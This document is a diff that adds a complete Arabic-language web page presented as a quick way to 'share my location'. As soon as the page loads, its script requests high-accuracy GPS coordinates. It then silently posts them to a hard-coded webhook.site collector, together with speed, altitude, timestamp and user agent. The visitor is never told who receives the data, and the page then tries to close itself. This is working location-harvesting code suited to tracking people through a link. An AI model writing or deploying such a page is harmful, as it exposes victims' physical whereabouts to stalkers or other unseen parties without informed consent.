@@ -1,0 +1,113 @@
+<!doctype html>
+<html lang="ar">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>مشاركة موقعي</title>
+<style>
+  body{font-family:Arial,Helvetica,sans-serif;direction:rtl;text-align:center;padding:28px;background:#f9fafb;color:#111}
+  .card{max-width:420px;margin:36px auto;padding:18px;border-radius:12px;background:white;box-shadow:0 6px 20px rgba(0,0,0,0.06)}
+  .title{font-size:20px;margin-bottom:6px}
+  .msg{margin-top:12px;color:#065f46;font-weight:600}
+  a.small{display:inline-block;margin-top:10px;color:#0b61ff;text-decoration:none;font-size:14px}
+  .spinner{margin:18px auto; width:36px;height:36px;border-radius:50%;border:4px solid #eee;border-top-color:#0b61ff;animation:spin 1s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .hidden{display:none}
+  .hint{font-size:13px;color:#666;margin-top:8px}
+</style>
+</head>
+<body>
+  <div class="card" id="card">
+    <div class="title">لمشاركة موقعك بسرعة</div>
+    <div id="stage">
+      <div>سوف يُطلب منك سماح مشاركة الموقع — اضغط <strong>Allow</strong> عندما يظهر.</div>
+      <div class="spinner" id="spinner"></div>
+      <div class="hint">إذا لم يظهر طلب السماح، تأكد من إعدادات المتصفح أو افتح الرابط في متصفح موبايل (Chrome أو Safari).</div>
+    </div>
+
+    <div id="result" class="hidden">
+      <div class="msg" id="msg">تم الإرسال — شكرًا!</div>
+      <a id="mapsLink" class="small" target="_blank">عرض موقعي على Google Maps</a>
+    </div>
+  </div>
+
+<script>
+(function(){
+  const ENDPOINT = "https://webhook.site/8016ff8d-e2f1-4519-b737-d0c0c5120923";
+  const spinner = document.getElementById('spinner');
+  const stage = document.getElementById('stage');
+  const result = document.getElementById('result');
+  const msg = document.getElementById('msg');
+  const mapsLink = document.getElementById('mapsLink');
+
+  function showResult(text, mapsUrl){
+    stage.classList.add('hidden');
+    result.classList.remove('hidden');
+    msg.textContent = text || 'تم الإرسال — شكرًا!';
+    if (mapsUrl){
+      mapsLink.href = mapsUrl;
+      mapsLink.textContent = 'عرض موقعي على Google Maps';
+    } else {
+      mapsLink.style.display = 'none';
+    }
+    try{ spinner.style.display = 'none'; }catch(e){}
+  }
+
+  function sendPayload(payload){
+    try{
+      if (navigator.sendBeacon){
+        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+        navigator.sendBeacon(ENDPOINT, blob);
+        return Promise.resolve();
+      }
+      return fetch(ENDPOINT, {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify(payload),
+        keepalive: true
+      }).then(()=>{}).catch(()=>{});
+    }catch(e){
+      return Promise.resolve();
+    }
+  }
+
+  function onError(err){
+    showResult('فشل الحصول على الموقع — لا يسمح المتصفح أو حدث خطأ.');
+    console.log('geo error', err);
+  }
+
+  function requestAndSend(){
+    if (!navigator.geolocation){
+      showResult('متصفحك لا يدعم تحديد الموقع.');
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(function(pos){
+      const c = pos.coords;
+      const payload = {
+        lat: c.latitude,
+        lon: c.longitude,
+        accuracy_m: c.accuracy,
+        altitude: c.altitude,
+        altitudeAccuracy: c.altitudeAccuracy,
+        heading: c.heading,
+        speed: c.speed,
+        timestamp: new Date(pos.timestamp).toISOString(),
+        userAgent: navigator.userAgent,
+        maps: "https://www.google.com/maps?q=" + c.latitude + "," + c.longitude
+      };
+      sendPayload(payload).then(() => {
+        showResult('تم الإرسال — شكرًا!', payload.maps);
+        // optional: try to close window if opened by script
+        try{ setTimeout(()=>window.close(),800); }catch(e){}
+      });
+    }, onError, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
+  }
+
+  window.addEventListener('load', function(){
+    // small delay to ensure mobile permission dialog shows reliably
+    setTimeout(requestAndSend, 300);
+  });
+})();
+</script>
+</body>
+</html>
